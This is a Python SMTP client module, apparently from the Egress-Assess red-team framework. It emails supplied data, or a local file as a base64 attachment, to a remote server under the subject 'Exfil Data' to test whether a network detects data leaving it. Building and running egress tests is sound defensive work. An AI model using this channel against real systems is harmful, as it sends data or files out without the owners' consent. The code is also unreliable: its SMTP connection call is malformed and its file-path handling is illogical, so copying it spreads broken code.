"""

This is a SMTP client module.  Sample code came from:
http://pymotw.com/2/smtpd/

"""

import smtplib
import email.utils
from email import encoders
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


class Client:

    # Within __init__, you have access to everything passed in
    # via the command line.  self.protocol is the variable listed
    # when running --list-clients and is what is used in conjunction
    # with --client <client>.  self.protocol is the only required attribute
    # of the object.
    def __init__(self, cli_object):
        self.protocol = 'smtp'
        self.remote_server = cli_object.ip
        if cli_object.client_port is None:
            self.port = 25
        else:
            self.port = cli_object.client_port

        if cli_object.file is None:
            self.file_transfer = False
        else:
            if '/' in cli_object.file:
                self.file_transfer = cli_object.file
            else:
                self.file_transfer = cli_object.file.split('/')[-1]

    # transmit is the only required function within the object.  It is what
    # called by the framework to transmit data.  However, you can create as 
    # many "sub functions" for transmit to invoke as needed.  "data_to_transmit"
    # is a variable passed in by the framework which contains the data that 
    # is to be sent out by the client.
    def transmit(self, data_to_transmit):

        print('[*] Sending data over e-mail...')

        if not self.file_transfer:
            # Create the message
            msg = MIMEText('This is the data to exfil:\n\n' + data_to_transmit)
            msg['To'] = email.utils.formataddr(('Server', 'server@egress-assess.com'))
            msg['From'] = email.utils.formataddr(('Tester', 'tester@egress-assess.com'))
            msg['Subject'] = 'Egress-Assess Exfil Data'
        else:
            msg = MIMEMultipart()
            msg['Subject'] = 'Egress-Assess Exfil Data'
            msg['From'] = email.utils.formataddr(('Tester', 'tester@egress-assess.com'))
            msg['To'] = email.utils.formataddr(('Server', 'server@egress-assess.com'))

            part = MIMEBase('application', "octet-stream")
            part.set_payload(open(self.file_transfer, "rb").read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'attachment; filename=' + self.file_transfer)
            msg.attach(part)

        server = smtplib.SMTP.connect(self.remote_server, host=self.remote_server, port=self.port)
        try:
            server.sendmail('tester@egress-assess.com', ['server@egress-assess.com'], msg.as_string())
        finally:
            server.quit()

        print('[*] Data transmitted!')
